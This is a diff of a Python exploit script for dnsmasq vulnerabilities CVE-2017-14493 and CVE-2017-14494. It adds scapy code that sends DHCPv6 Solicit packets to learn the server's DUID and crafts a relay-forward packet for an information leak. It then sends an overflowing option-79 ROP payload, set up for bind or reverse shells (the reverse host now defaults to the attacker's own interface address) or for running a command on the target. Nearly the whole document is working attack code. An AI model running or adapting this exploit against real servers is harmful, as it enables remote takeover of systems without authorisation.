@@ -2,8 +2,16 @@
 
 from base import Base
 from argparse import ArgumentParser
-from socket import socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP, SOL_SOCKET, SO_SNDBUF
 from sys import exit
+from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
+from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
+from random import randint
+from netaddr import EUI
+from tm import ThreadManager
+from time import sleep
+from binascii import unhexlify
+
+tm = ThreadManager(3)
 
 # Architecture i386 segments address
 
@@ -124,12 +132,14 @@ ROP = {
     }
 }
 
+N_BYTES = 0x0800
 
 Base = Base()
 Base.print_banner()
 
-parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 (Stack Based overflow)')
+parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 and CVE-2017-14494')
 
+parser.add_argument('-i', '--interface', help='Set interface name for send packets')
 parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
 parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
 parser.add_argument('-a', '--architecture', help='Set architecture (i386 or amd64), default=i386', default='i386')
@@ -146,9 +156,26 @@ parser.add_argument('--command', type=str, help='Set command for executing on ta
 
 parser.add_argument('--bind_port', type=int, help='Set bind port, default=4444', default=4444)
 parser.add_argument('--reverse_port', type=int, help='Set reverse port, default=4444', default=4444)
-parser.add_argument('--reverse_host', type=str, help='Set reverse host, default="127.0.0.1"', default="127.0.0.1")
+parser.add_argument('--reverse_host', type=str, help='Set reverse host')
 
 args = parser.parse_args()
+
+current_network_interface = None
+if args.interface is None:
+    current_network_interface = Base.netiface_selection()
+else:
+    current_network_interface = args.interface
+
+macsrc = Base.get_netiface_mac_address(current_network_interface)
+ipv6src_link = Base.get_netiface_ipv6_address(current_network_interface, 1)
+ipv6src = Base.get_netiface_ipv6_address(current_network_interface, 0)
+dhcpv6_server_duid = None
+dhcpv6_server_ipv6_link = None
+dhcpv6_server_mac = None
+
+eth = Ether()
+ipv6 = IPv6()
+udp = UDP()
 
 host = str(args.target)
 port = int(args.target_port)
@@ -187,7 +214,13 @@ if 0 < int(args.reverse_port) < 65535:
 else:
     print Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports"
 
-reverse_host = str(args.reverse_host)
+reverse_host = "127.0.0.1"
+if args.reverse_host is None:
+    reverse_host = Base.get_netiface_ip_address(current_network_interface)
+    if reverse_host is None:
+        reverse_host = "127.0.0.1"
+else:
+    reverse_host = str(args.reverse_host)
 
 # Payloads
 rstr = Base.make_random_string(3)
@@ -221,23 +254,63 @@ else:
         exit(1)
 
 
-def send_packet(data, host, port):
-    print Base.c_info + "Architecture: " + architecture
-    print Base.c_info + "Dnsmasq version: " + dnsmasq_version
-    print Base.c_info + "Interpreter: " + interpreter
-    print Base.c_info + "Interpreter arg: " + interpreter_arg
-    print Base.c_info + "Payload: " + payload
-    print Base.c_info + "Address segment .text: " + str(TEXT[architecture][dnsmasq_version])
-    print Base.c_info + "Address segment .data: " + str(DATA[architecture][dnsmasq_version])
-    print Base.c_info + "Address execl function: " + str(EXECL[architecture][dnsmasq_version])
+def send_dhcpv6_solicit():
+    sol = DHCP6_Solicit()
+    rc = DHCP6OptRapidCommit()
+    opreq = DHCP6OptOptReq()
+    et = DHCP6OptElapsedTime()
+    cid = DHCP6OptClientId()
+    iana = DHCP6OptIA_NA()
 
-    print Base.c_success + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
-    sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
+    rc.optlen = 0
+    opreq.optlen = 4
+    iana.optlen = 12
+    iana.T1 = 0
+    iana.T2 = 0
+    cid.optlen = 10
+    sol.trid = randint(0, 16777215)
 
-    sock.setsockopt(SOL_SOCKET, SO_SNDBUF, len(data))
-    if sock.sendto(data, (host, port)) != len(data):
-        print Base.c_error + "Could not send (full) payload"
-    sock.close()
+    eth.src = macsrc
+    eth.dst = "33:33:00:01:00:02"
+
+    ipv6.src = ipv6src_link
+    ipv6.dst = "ff02::1:2"
+
+    udp.sport = 546
+    udp.dport = 547
+
+    cid.duid = ("00030001" + str(EUI(macsrc)).replace("-", "")).decode("hex")
+
+    pkt = eth / ipv6 / udp / sol / iana / rc / et / cid / opreq
+
+    try:
+        sendp(pkt, iface=current_network_interface, verbose=False)
+        print Base.c_info + "Send Solicit request to: [ff02::1:2]:547"
+    except:
+        print Base.c_error + "Do not send Solicit request."
+        exit(1)
+
+
+def recv_dhcpv6_reply():
+    sniff(iface=current_network_interface, stop_filter=dhcpv6_callback,
+          filter="udp and src port 547 and dst port 546 and ip6 dst host " + ipv6src_link)
+
+
+def dhcpv6_callback(pkt):
+    global dhcpv6_server_mac
+    global dhcpv6_server_ipv6_link
+    global dhcpv6_server_duid
+
+    if pkt.haslayer(DHCP6_Reply):
+        if pkt[DHCP6OptServerId].duid is None:
+            return False
+        else:
+            dhcpv6_server_mac = pkt[Ether].src
+            dhcpv6_server_ipv6_link = pkt[IPv6].src
+            dhcpv6_server_duid = pkt[DHCP6OptServerId].duid
+            return True
+    else:
+        return False
 
 
 def gen_option(option, data, length=None):
@@ -300,7 +373,81 @@ def add_string_in_data(addr_in_data, string):
     return rop_chain
 
 
-if __name__ == '__main__':
+def inner_pkg(duid):
+        return b"".join([
+        Base.pack8(5),            # Type = DHCP6RENEW
+        Base.pack8(0), Base.pack16(1337), # ID
+        gen_option(2, duid),
+        gen_option(1, "", length=(N_BYTES - 8 - 18)) # Client ID
+    ])
+
+
+def info_leak():
+    print Base.c_info + "Wait for receive DHCPv6 server duid..."
+    tm.add_task(recv_dhcpv6_reply)
+    sleep(3)
+    send_dhcpv6_solicit()
+    sleep(5)
+
+    while True:
+        if dhcpv6_server_duid is None:
+            send_dhcpv6_solicit()
+            sleep(5)
+        else:
+            break
+
+    print Base.c_success + "DHCPv6 server mac address: " + str(dhcpv6_server_mac)
+    print Base.c_success + "DHCPv6 server IPv6 link address: " + str(dhcpv6_server_ipv6_link)
+    print Base.c_success + "DHCPv6 server duid: " + str(dhcpv6_server_duid).encode("hex")
+
+    duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
+    assert len(duid) == 14
+
+    pkg = b"".join([
+        Base.pack8(12),  # DHCP6RELAYFORW
+        '?',
+        # Client addr
+        '\xFD\x00',
+        '\x00\x00' * 6,
+        '\x00\x05',
+        '_' * (33 - 17),  # Skip random data.
+        # Option 9 - OPTION6_RELAY_MSG
+        gen_option(9, inner_pkg(duid), length=N_BYTES),
+    ])
+
+    eth.src = macsrc
+    eth.dst = dhcpv6_server_mac
+
+    ipv6.src = ipv6src
+    ipv6.dst = host
+
+    udp.sport = 547
+    udp.dport = 547
+
+    pkt = eth / ipv6 / udp / pkg
+
+    try:
+        sendp(pkt, iface=current_network_interface, verbose=False)
+        print Base.c_info + "Send info leak request to: [" + host + "]:" + str(udp.dport)
+    except:
+        print Base.c_error + "Do not send info leak request."
+        exit(1)
+
+    # # Setup receiving port
+    # sock = socket(AF_INET6, SOCK_DGRAM)
+    # sock.setsockopt(SOL_SOCKET, SO_RCVBUF, N_BYTES)
+    # sock.bind(('::', 547))
+    #
+    # Send request
+
+    # send_packet(pkg, host, 547)
+    #
+    # # Dump response
+    # with open('response.bin', 'wb') as f:
+    #     f.write(sock.recvfrom(N_BYTES)[0])
+
+
+def exploit():
     option_79 = ""
     if architecture == "i386":
 
@@ -332,7 +479,7 @@ if __name__ == '__main__':
     else:
         print Base.c_error + "This architecture: " + architecture + " not yet supported!"
         exit(1)
-    
+
     pkg = b"".join([
         Base.pack8(12),       # DHCP6RELAYFORW
         Base.pack16(0x0313),  #
@@ -343,4 +490,35 @@ if __name__ == '__main__':
         gen_option(79, option_79),
     ])
 
-    send_packet(pkg, host, int(port))
+    eth.src = macsrc
+    eth.dst = dhcpv6_server_mac
+
+    ipv6.src = ipv6src
+    ipv6.dst = host
+
+    udp.sport = 546
+    udp.dport = 547
+
+    pkt = eth / ipv6 / udp / pkg
+
+    try:
+        sendp(pkt, iface=current_network_interface, verbose=False)
+        print Base.c_success + "Send exploit request to: [" + host + "]:" + str(udp.dport)
+    except:
+        print Base.c_error + "Do not send exploit request."
+        exit(1)
+
+
+if __name__ == '__main__':
+
+    print Base.c_info + "Architecture: " + architecture
+    print Base.c_info + "Dnsmasq version: " + dnsmasq_version
+    print Base.c_info + "Interpreter: " + interpreter
+    print Base.c_info + "Interpreter arg: " + interpreter_arg
+    print Base.c_info + "Payload: " + payload
+    print Base.c_info + "Address segment .text: " + str(TEXT[architecture][dnsmasq_version])
+    print Base.c_info + "Address segment .data: " + str(DATA[architecture][dnsmasq_version])
+    print Base.c_info + "Address execl function: " + str(EXECL[architecture][dnsmasq_version])
+
+    # info_leak()
+    exploit()
